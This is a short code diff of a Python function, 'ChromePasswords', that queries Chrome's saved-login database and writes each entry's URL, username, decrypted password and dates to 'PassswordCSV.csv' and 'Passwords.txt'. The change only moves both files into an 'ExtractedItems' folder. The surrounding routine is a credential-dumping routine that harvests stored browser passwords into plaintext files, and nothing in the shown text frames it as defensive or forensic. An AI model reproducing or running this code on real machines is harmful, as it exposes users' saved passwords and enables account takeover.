@@ -73,7 +73,7 @@ def ChromePasswords():
         "select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins "
         "order by date_last_used")
     #write csv
-    with open('PassswordCSV.csv', "w", encoding="utf-8") as file:
+    with open('ExtractedItems/PassswordCSV.csv', "w", encoding="utf-8") as file:
         file.write('main_url,login_page_url,user_name,decrypted_password,date_of_creation,last_usuage\n')
         for i in cursor.fetchall():
             main_url = i[0]
@@ -84,7 +84,7 @@ def ChromePasswords():
             last_usuage = i[5]
             file.write("{0}, {1}, {2}, {3}, {4}, {5}\n".format(main_url, login_page_url, user_name,decrypted_password, date_of_creation, last_usuage))
     # iterate over all rows
-    file1 = open("Passwords.txt","w")
+    file1 = open("ExtractedItems/Passwords.txt","w")
     for row in cursor.fetchall():
         main_url = row[0]
         login_page_url = row[1]
